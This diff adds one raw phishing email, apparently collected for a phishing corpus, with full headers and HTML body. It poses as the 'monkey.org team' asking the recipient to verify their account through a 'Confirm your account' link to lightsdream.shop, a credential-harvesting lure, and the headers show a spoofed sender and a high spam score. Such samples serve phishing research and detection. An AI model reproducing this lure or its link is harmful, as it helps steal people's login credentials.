@@ -1,0 +1,112 @@
+Return-Path: hnakatani@bizcomjapan.co.jp
+Delivered-To: jose@monkey.org
+X-FDA: 82142835894.27.3A7C1C4
+Received: from vs205189.randomserver.com (unknown [66.63.168.118])
+	by imf30.b.hostedemail.com (Postfix) with ESMTP id 33C38180019
+	for <jose@monkey.org>; Tue, 21 May 2024 15:48:45 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=softfail (imf30.b.hostedemail.com: 66.63.168.118 is neither permitted nor
+ denied by domain of hnakatani@bizcomjapan.co.jp)
+ smtp.mailfrom=hnakatani@bizcomjapan.co.jp
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1716306526;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=5LhVcQyhtBuGAoJfObkwPiM1C6eWue0vkS0J4eDNErs=;
+	b=0fehJcdtNTl86Z5ztk2pG3snn+bsmZCCkd1VS893W5pCPnsLB8ojJXhMMIl56pYcIfRqyx
+	Y9KQsSTBE7BFl1V5+nySEBuux8cODI63oeR3DuITtCqbnLTupjqYnaDRxthnDWvhlxExHm
+	NPqtVpc6TLEJQVXsaMsZb7bj4VN/MS4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1716306526; a=rsa-sha256;
+	cv=none;
+	b=zHQjmvKIz0Du4FtBW9y1nCdsjjzluG3abxmPWuAFywtTdmvgJvZbrGrGe5rIGVdyed5nMl
+	I0oYhRvibKmF9/demS4tfT93VNPGuB7uiDVmCRy5JDg+3r8tIzHueiHUP7tsNoUX/KDL1e
+	mJweH0JtLOWfgiIcr+iPYt6RPqh8VFc=
+ARC-Authentication-Results: i=1;	imf30.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=softfail (imf30.b.hostedemail.com: 66.63.168.118 is neither
+ permitted nor denied by domain of hnakatani@bizcomjapan.co.jp)
+ smtp.mailfrom=hnakatani@bizcomjapan.co.jp
+Received: from bizcomjapan.co.jp (localhost [IPv6:::1])
+	by vs205189.randomserver.com (Postfix) with ESMTP id 3B8C247C28
+	for <jose@monkey.org>; Tue, 21 May 2024 11:07:47 -0400 (EDT)
+From: monkey.org<hnakatani@bizcomjapan.co.jp>
+To: jose@monkey.org
+Subject: jose@monkey.org Account verification
+Date: 21 May 2024 08:07:46 -0700
+Message-ID: <20240521080746.BBADAF504D692D40@bizcomjapan.co.jp>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 33C38180019
+X-Stat-Signature: i9c6iy4cmk9ixdkxuh1dzqkcgj5utz89
+X-Spam-Status: Yes, score=14.72
+X-Rspam-User: 
+X-HE-Tag: 1716306525-814220
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/qDKqbtpbTsaflNV1UkhEJVMxH018SoabhXuiLPlutfBP?=
+ =?utf-8?q?jTOXu3NZBrJJhieuI46TUCzejwbtuSonuCd18VosXnCFgjDZM8z3747DtAQ4ajd7X?=
+ =?utf-8?q?w5nVl0YA7XDV7Viw1LWkRsZSsTeb9rIAQjzEJ9s/dDZZFxPc2OOUNwVRGt+YUAayv?=
+ =?utf-8?q?ECQvpaxuL1w58gxdLJM6y5iSJ3VtxtWaYHOAYgDQx34mfzmWQ4=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 155
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18817"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P>
+<table style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPA=
+CE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: n=
+one; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; ORPHANS: 2=
+; WIDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l" dir=3D"ltr">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td id=3D"m_4818075401040918067m_1137311107790628826gmail-v1i3" style=3D"BO=
+X-SIZING: border-box; FONT-FAMILY: &quot;Segoe UI&quot;, Tahoma, Verdana, A=
+rial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDING-TOP: 2=
+5px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+Hiello&nbsp;<A id=3Dm_4818075401040918067m_1137311107790628826gmail-v1iAcco=
+unt style=3D"BOX-SIZING: border-box; COLOR: rgb(38,114,236); BACKGROUND-COL=
+OR: transparent; text-decoration-line: none" href=3D"mailto:jose" rel=3Dnor=
+eferrer target=3D_blank>jose</A>.</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td id=3D"m_4818075401040918067m_1137311107790628826gmail-v1i4" style=3D"BO=
+X-SIZING: border-box; FONT-FAMILY: &quot;Segoe UI&quot;, Tahoma, Verdana, A=
+rial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDING-TOP: 2=
+5px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">We'd like you to c=
+onfirm ownership of your account and complete the verification process.<BR>=
+To regain full access of&nbsp;<B>jose@monkey.org</B>&nbsp;click the link be=
+low.</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-FAMILY: &quot;Segoe UI&quot;, Tah=
+oma, Verdana, Arial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<table style=3D"BORDER-COLLAPSE: collapse" cellspacing=3D"0" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; =
+PADDING-TOP: 5px; PADDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BAC=
+KGROUND-COLOR: rgb(38,114,236)" bgcolor=3D"#2672ec">
+<A id=3Dm_4818075401040918067m_1137311107790628826gmail-v1i5 style=3D'BOX-S=
+IZING: border-box; FONT-FAMILY: "Segoe UI Semibold", "Segoe UI Bold", "Sego=
+e UI", "Helvetica Neue Medium", Arial, sans-serif; FONT-WEIGHT: 600; COLOR:=
+ rgb(255,255,255); TEXT-ALIGN: center; LETTER-SPACING: 0.02em; BACKGROUND-C=
+OLOR: transparent; text-decoration-line: none' href=3D"https://lightsdream.=
+shop/htry/index.html#jose@monkey.org" rel=3Dnoreferrer target=3D_blank>Conf=
+irm your account</A></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<td id=3D"m_4818075401040918067m_1137311107790628826gmail-v1i6" style=3D"BO=
+X-SIZING: border-box; FONT-FAMILY: &quot;Segoe UI&quot;, Tahoma, Verdana, A=
+rial, sans-serif; COLOR: rgb(42,42,42); PADDING-BOTTOM: 0px; PADDING-TOP: 2=
+5px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">Thanks,<BR>The mon=
+key.org team</TD></TR></TBODY></TABLE></P></BODY></HTML>
+
